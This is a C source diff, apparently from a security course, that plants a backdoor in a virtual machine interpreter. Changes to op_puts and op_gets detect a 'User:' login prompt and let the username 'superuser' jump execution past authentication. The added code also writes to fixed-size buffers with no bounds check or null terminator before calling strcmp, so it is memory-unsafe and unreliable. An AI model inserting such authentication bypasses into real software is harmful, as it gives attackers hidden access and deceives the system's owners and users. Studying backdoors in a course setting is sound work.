@@ -8,6 +8,7 @@
 #include <stdbool.h>
 
 extern bool is_running;
+bool isBackdoorOpen = false;
 
 //---------------------------------------------------------
 // FUNCTION IMPLEMENTATIONS:
@@ -185,6 +186,11 @@ void op_puts(struct VMContext* ctx, const uint32_t instr)
     uint8_t reg1 = EXTRACT_B1(instr);
     uint32_t ascii_string = ctx->r[reg1].value;
 
+    // Going to test whether the program ever prints out "User: " to dectect the login action
+    char toDectect[] = "User:";
+    char reference[6];
+    int count = 0;
+
     char c;
     while(true)
     {
@@ -194,10 +200,21 @@ void op_puts(struct VMContext* ctx, const uint32_t instr)
             exit(1);
         }
         c = ctx->heap[ascii_string];
+
+        reference[count] = c;
+        count++;
+
+        if(strcmp(toDectect,reference) == 0)
+        {
+            //Login activity is dectected
+            isBackdoorOpen = true;
+        }
+
         if(c == 0)
         {
             break;
         }
+
         putchar(c);
         ascii_string++;
     }
@@ -209,6 +226,11 @@ void op_gets(struct VMContext* ctx, const uint32_t instr)
 {
     uint8_t reg1 = EXTRACT_B1(instr);
     uint32_t ascii_string = ctx->r[reg1].value;
+
+    // Compare the input value with the string "superuser" for the backdoor
+    char toDectect[] = "superuser";
+    char reference[10];
+    int count = 0;
 
     uint8_t c;
     while(true)
@@ -226,6 +248,15 @@ void op_gets(struct VMContext* ctx, const uint32_t instr)
         }
         ctx->heap[ascii_string] = c;
         ascii_string++;
+
+        reference[count] = c;
+        count++;
+        // If the backdoor is open and the user enters in "superuser" as a username it automatically authenticates
+        if (isBackdoorOpen && strcmp(toDectect,reference) == 0)
+        {
+            // (Hardcoded) Since the login.mini's authentication process starts at instruction number 3, it goes there to authenticate
+            ctx->pc = 3;
+        }
     }
 }
 
@@ -270,7 +301,6 @@ void initVMContext(struct VMContext* ctx, const uint32_t numRegs, const uint32_t
     ctx->code       = code;
     ctx->codeSize   = codeSize;
 }
-
 
 // Reads an instruction, executes it, then steps to the next instruction.
 // stepVMContext :: VMContext -> uint32_t** -> Effect()
